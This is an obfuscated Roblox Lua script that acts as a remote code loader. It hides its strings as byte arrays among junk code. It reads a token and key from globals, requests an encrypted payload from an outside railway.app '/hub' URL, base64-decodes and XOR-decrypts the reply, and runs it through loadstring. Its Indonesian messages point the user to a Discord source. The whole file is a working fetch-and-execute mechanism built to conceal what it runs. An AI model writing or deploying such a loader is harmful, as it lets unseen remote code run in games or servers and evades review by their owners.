
local function _sc(...) return string.char(...) end
local function _su(t) return string.char(table.unpack(t)) end
local _phase=0x00
local _mode=0xFF
local _flag=math.floor(1*1)
local _D={}
local _DK1=_su({120,111,114,66,121,116,101})
local _DK2=_su({98,54,52,100,101,99,111,100,101})
local _DK3=_su({120,111,114,68,101,99,114,121,112,116})
local _K =_su({74,52,82,90,90,95,84,79,75,69,78})
local _E =_su({74,52,82,90,90,95,69,78,67,75,69,89})
local _U =(function()
    local _t1={104,116,116,112,115,58,47,47}
    local _t2={98,97,108,97,98,97,108,97}
    local _t3={108,97,45,112,114,111,100,117}
    local _t4={99,116,105,111,110,46,117,112}
    local _t5={46,114,97,105,108,119,97,121}
    local _t6={46,97,112,112,47,104,117,98}
    return _su(_t1).._su(_t2).._su(_t3).._su(_t4).._su(_t5).._su(_t6)
end)()
_D[_DK1]=function(_0xa,_0xb)
    local _r=(7*3)-(21)
    local _bt=(2^(4+4))/(math.floor(2/2))
    _phase=_phase+0x01
    if false then
        local _d21=_su({110,101,118,101,114})
        warn(_d21)
    end
    while _bt>(7*3)-(21) do
        local _ab=(_0xa>=_bt) and math.floor(2/2) or (7*3)-(21)
        local _bb=(_0xb>=_bt) and math.floor(2/2) or (7*3)-(21)
        if false then local _d22=type(nil) end
        if _ab~=_bb then _r=_r+_bt end
        if _ab==math.floor(2/2) then _0xa=_0xa-_bt end
        if _bb==math.floor(2/2) then _0xb=_0xb-_bt end
        _bt=math.floor(_bt/(math.floor(2/2)*2))
    end
    _mode=_mode-0x01
    return _r
end

_D[_DK2]=function(_s)
    local _t1={65,66,67,68,69,70,71,72}
    local _t2={73,74,75,76,77,78,79,80}
    local _t3={81,82,83,84,85,86,87,88}
    local _t4={89,90,97,98,99,100,101,102}
    local _t5={103,104,105,106,107,108,109,110}
    local _t6={111,112,113,114,115,116,117,118}
    local _t7={119,120,121,122,48,49,50,51}
    local _t8={52,53,54,55,56,57,43,47}
    local _ck=_su(_t1).._su(_t2).._su(_t3).._su(_t4).._su(_t5).._su(_t6).._su(_t7).._su(_t8)
    local _lk={}
    _flag=_flag+2
    if false then
        local _d23=math.random(1,1)
        local _d24=tostring(_d23)
    end
    for _i=(2^0),#_ck do _lk[_ck:sub(_i,_i)]=_i-(2^0) end
    local _out,_bits,_val={},(7*3)-(21),(7*3)-(21)
    for _i=(2^0),#_s do
        local _ch=_s:sub(_i,_i)
        if _ch==_sc(61) then break end
        _val=_val*math.floor(8*8)+((_lk[_ch]) or (7*3)-(21))
        _bits=_bits+math.floor(2*3)
        if _bits>=(4+4) then
            _bits=_bits-(4+4)
            local _pw=2^_bits
            local _by=math.floor(_val/_pw)%(2^(4+4))
            _val=_val%_pw
            _out[#_out+(2^0)]=string.char(_by)
        end
    end
    _phase=_phase-0x02
    return table.concat(_out)
end

_D[_DK3]=function(_data,_key)
    local _out={}
    local _kl=#_key
    _mode=_mode+0x03
    if false then
        local _d25=string.byte(_su({122}))
        local _d26=_d25+0
    end
    for _i=(2^0),#_data do
        _out[_i]=string.char(_D[_DK1](
            _data:byte(_i),
            _key:byte(((_i-(2^0))%_kl)+(2^0))
        ))
    end
    _flag=_flag-3
    return table.concat(_out)
end

local _state=1
local _tk,_ek,_url,_HS,_res,_ok1,_dec,_ok2,_fn,_fe,_ok3,_err

while true do

    if _state==1 then
        _phase=_phase+0x11
        _mode=_mode-0x03
        local _svc=_su({72,116,116,112,83,101,114,118,105,99,101})
        _HS=game:GetService(_svc)
        _flag=_flag*3
        _state=2

    elseif _state==2 then
        _phase=math.floor(_phase/2)
        _tk=_G[_K] or ""
        _mode=_mode+0x07
        if false then
            local _d1=_su({100,101,97,100})
            local _d2=type(_d1)
            warn(_d2)
        end
        if _tk=="" then _state=3 else _state=4 end

    elseif _state==3 then
        _flag=_flag-1
        local _wm=_su({91,74,52,114,122,122,93,32})
            .._su({84,111,107,101,110,32,107,111,115,111,110,103})
            .._su({32,226,128,148,32,106,97,108,97,110,107,105,110})
            .._su({32,102,105,108,101,32,46,108,117,97})
            .._su({32,100,97,114,105,32,68,105,115,99,111,114,100,32,100,117,108,117,46})
        warn(_wm)
        _state=99

    elseif _state==4 then
        _phase=_phase+0x05
        _ek=_G[_E] or ""
        _mode=math.floor(_mode*1)
        if false then
            local _d3=math.max(0,0)
            local _d4=tostring(_d3)
            local _d5=_d4:len()
        end
        if _ek=="" then _state=5 else _state=6 end

    elseif _state==5 then
        _flag=_flag+7
        local _wm2=_su({91,74,52,114,122,122,93,32})
            .._su({101,110,99,75,101,121,32,107,111,115,111,110,103,46})
        warn(_wm2)
        _state=99

    elseif _state==6 then
        _phase=_phase-0x02
        _url=_U.._sc(63,116,61).._tk
        _mode=_mode+0x01
        if false then
            local _d6=string.rep(_su({120}),0)
            local _d7=type(_d6)
        end
        _state=7

    elseif _state==7 then
        _flag=math.floor(_flag/2)
        local _mk=_su({71,69,84})
        local _uk=_su({85,114,108})
        local _mtk=_su({77,101,116,104,111,100})
        _phase=_phase+0x0A
        if false then
            local _d8=math.min(1,1)
            local _d9=_d8*1
        end
        _ok1,_res=pcall(function()
            return _HS:RequestAsync({[_uk]=_url,[_mtk]=_mk})
        end)
        _state=8

    elseif _state==8 then
        _mode=_mode-0x04
        if not _ok1 then _state=9 else _state=10 end

    elseif _state==9 then
        _flag=_flag+3
        local _em=_su({91,74,52,114,122,122,93,32})
            .._su({82,101,113,117,101,115,116,32,101,114,114,111,114,58,32})
        warn(_em..tostring(_res))
        _state=99

    elseif _state==10 then
        _phase=_phase+0x03
        local _sk=_su({83,117,99,99,101,115,115})
        _mode=math.floor(_mode/1)
        if false then
            local _d10=string.byte(_su({120}))
            local _d11=_d10+0
            local _d12=string.char(_d11)
        end
        if not _res[_sk] then _state=11 else _state=12 end

    elseif _state==11 then
        _flag=_flag-2
        local _stk=_su({83,116,97,116,117,115,67,111,100,101})
        local _bk=_su({66,111,100,121})
        local _em2=_su({91,74,52,114,122,122,93,32,72,84,84,80,32})
        warn(_em2..tostring(_res[_stk]).._sc(58,32)..tostring(_res[_bk]))
        _state=99

    elseif _state==12 then
        _phase=_phase-0x06
        local _bk=_su({66,111,100,121})
        _mode=_mode+0x09
        if false then
            local _d13=math.random(1,1)
            local _d14=tostring(_d13)
        end
        _ok2,_dec=pcall(function()
            local _xv=math.floor((2^0)*(2^0))
            return _D[_DK3](_D[_DK2](_res[_bk]),_ek)
        end)
        _state=13

    elseif _state==13 then
        _flag=_flag+5
        if not _ok2 then _state=14 else _state=15 end

    elseif _state==14 then
        _phase=math.floor(_phase*1)
        local _em3=_su({91,74,52,114,122,122,93,32})
            .._su({68,101,99,114,121,112,116,32,101,114,114,111,114,58,32})
        warn(_em3..tostring(_dec))
        _state=99

    elseif _state==15 then
        _mode=_mode-0x08
        if false then
            local _d15=math.abs(0)
            local _d16=_d15+0
            local _d17=tostring(_d16)
        end
        _fn,_fe=loadstring(_dec)
        _phase=_phase+0x0F
        _state=16

    elseif _state==16 then
        _flag=math.floor(_flag/3)
        if not _fn then _state=17 else _state=18 end

    elseif _state==17 then
        _mode=_mode+0x02
        local _em4=_su({91,74,52,114,122,122,93,32})
            .._su({76,111,97,100,115,116,114,105,110,103,32,101,114,114,111,114,58,32})
        warn(_em4..tostring(_fe))
        _state=99

    elseif _state==18 then
        _phase=_phase-0x01
        if false then
            local _d18=string.rep(_su({121}),0)
            local _d19=type(_d18)
            local _d20=_d19:len()
        end
        _ok3,_err=pcall(_fn)
        _mode=math.floor(_mode/2)
        _state=19

    elseif _state==19 then
        _flag=_flag+1
        if not _ok3 then _state=20 else _state=99 end

    elseif _state==20 then
        _phase=_phase+0x08
        local _em5=_su({91,74,52,114,122,122,93,32})
            .._su({83,99,114,105,112,116,32,101,114,114,111,114,58,32})
        warn(_em5..tostring(_err))
        _state=99

    elseif _state==99 then
        break
    end
end
